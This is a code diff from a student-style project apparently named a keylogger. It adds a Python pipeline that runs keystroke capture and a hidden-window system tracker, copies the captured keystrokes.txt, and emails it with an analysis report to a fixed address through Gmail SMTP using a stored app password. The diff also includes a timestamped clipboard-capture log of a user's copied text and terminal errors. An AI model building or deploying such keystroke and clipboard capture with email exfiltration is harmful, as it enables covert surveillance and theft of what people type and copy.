+        stdin=sys.stdin,
+        stdout=sys.stdout,
+        stderr=sys.stderr
+    )
+
+    log("?? Select user manually and type")
+
+    time.sleep(120)   # ? 120 seconds timeout
+
+    process.terminate()
+    time.sleep(3)
+
+    log("behavior_auth stopped after 120 sec")
+
+    # ---------------- COPY KEYSTROKES ----------------
+    user_folder = get_latest_user_folder()
+
+    if not user_folder:
+        log("User folder not found")
+        exit(1)
+
+    src = os.path.join(user_folder, "keystrokes.txt")
+    dst = "keystrokes.txt"
+
+    if os.path.exists(src):
+        shutil.copy(src, dst)
+        log(f"Copied keystrokes.txt from {user_folder}")
+    else:
+        log("keystrokes.txt not found")
+        exit(1)
+
+    # ---------------- PREPROCESS ----------------
+    run_step("preprocess_keylog.py", ["python", "preprocess_keylog.py"])
+
+    # ---------------- SYSTEM TRACK ----------------
+    log("Running system_track (20 sec)...")
+
+    process = subprocess.Popen(["python", "system_track.pyw"])
+    time.sleep(20)   # ? 20 seconds
+    process.terminate()
+    time.sleep(2)
+
+    log("system_track stopped")
+
+    # ---------------- ANALYZER ----------------
+    analyzer_output = run_step(
+        "activity-analyzer/main.py",
+        ["python", "activity-analyzer/main.py"]
+    )
+
+    with open("analysis_output.txt", "w", encoding="utf-8") as f:
+        f.write(analyzer_output)
+
+    ATTACHMENTS.append("analysis_output.txt")
+
+    # ---------------- EMAIL ----------------
+    log("Sending email...")
+
+    auth_status = get_auth_status()
+
+    msg = EmailMessage()
+    msg["Subject"] = "Keystroke Analysis Report"
+    msg["From"] = SENDER_EMAIL
+    msg["To"] = RECEIVER_EMAIL
+
+    report = f"""
+===== KEYSTROKE ANALYSIS REPORT =====
+
+Authentication Status:
+{auth_status}
+
+Activity Analysis:
+{analyzer_output}
+
+=====================================
+"""
+
+    msg.set_content(report)
+
+    for file in ATTACHMENTS:
+        if os.path.exists(file):
+            with open(file, "rb") as f:
+                msg.add_attachment(
+                    f.read(),
+                    maintype="application",
+                    subtype="octet-stream",
+                    filename=file
+                )
+            log(f"Attached: {file}")
+        else:
+            log(f"Missing: {file}")
+
+    try:
+        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
+            smtp.login(SENDER_EMAIL, APP_PASSWORD)
+            smtp.send_message(msg)
+
+        log("Email sent successfully")
+
+    except Exception as e:
+        log(f"Email error: {e}")
+
+    log("===== PIPELINE COMPLETED =====")
+
+
+# ---------- RUN ----------
+if __name__ == "__main__":
+    run_all()
+
+Time: 2026-03-18 00:29:25.246252
+Clipboard Data: report = f"""
+================= KEYSTROKE ANALYSIS REPORT =================
+
+?? Analysis Duration:
+Last 2 Minutes User Activity
+
+?? Authentication Result:
+{auth_status}
+
+?? User Activity Classification:
+------------------------------------------------------------
+{analyzer_output}
+------------------------------------------------------------
+
+?? Interpretation:
+Based on the last 2 minutes of captured keystroke behavior:
+
+- The system analyzed typing dynamics including speed, dwell time, and patterns.
+- Activity classification is generated using behavioral analysis.
+- Low confidence or zero activity indicates insufficient interaction data.
+
+?? Final Conclusion:
+- If activity data is valid ? user behavior is considered.
+- If activity is missing/zero ? result may not be reliable.
+- Authentication decision is based on trained model + anomaly detection.
+
+=============================================================
+"""
+
+Time: 2026-03-18 00:36:33.162073
+Clipboard Data: log("Running behavior_auth (manual mode, 60 sec)...")
+
+process = subprocess.Popen(
+    ["python", "behavior_auth.py"],
+    stdin=sys.stdin,
+    stdout=sys.stdout,
+    stderr=sys.stderr
+)
+
+log("?? Select user manually and start typing")
+
+def stop_process_after_timeout(p, timeout):
+    time.sleep(timeout)
+    if p.poll() is None:  # still running
+        log("? Timeout reached (60 sec). Stopping behavior_auth...")
+        p.terminate()
+
+# run timeout thread
+timer_thread = threading.Thread(
+    target=stop_process_after_timeout,
+    args=(process, 60)
+)
+timer_thread.start()
+
+process.wait()  # wait until user exits OR timeout
+
+log("behavior_auth finished")
+
+Time: 2026-03-18 00:44:00.453226
+Clipboard Data: log("Running behavior_auth (manual mode, 60 sec)...")
+
+process = subprocess.Popen(
+    ["python", "behavior_auth.py"],
+    stdin=sys.stdin,
+    stdout=sys.stdout,
+    stderr=sys.stderr
+)
+
+log("?? Select user manually and start typing")
+
+def stop_process_after_timeout(p, timeout):
+    time.sleep(timeout)
+    if p.poll() is None:  # still running
+        log("? Timeout reached (60 sec). Stopping behavior_auth...")
+        p.terminate()
+
+# run timeout thread
+timer_thread = threading.Thread(
+    target=stop_process_after_timeout,
+    args=(process, 60)
+)
+timer_thread.start()
+
+process.wait()  # wait until user exits OR timeout
+
+log("behavior_auth finished")
+
+Time: 2026-03-18 00:58:51.012851
+Clipboard Data: PS C:\Users\alank\Major_proj_keylogger_2> python run_all.py
+  File "C:\Users\alank\Major_proj_keylogger_2\run_all.py", line 123
+    user_folder = get_latest_user_folder()
+IndentationError: unexpected indent
+
+Time: 2026-03-18 01:02:00.810523
+Clipboard Data: PS C:\Users\alank\Major_proj_keylogger_2> python run_all.py
+  File "C:\Users\alank\Major_proj_keylogger_2\run_all.py", line 123
+    user_folder = get_latest_user_folder()
+IndentationError: unexpected indent
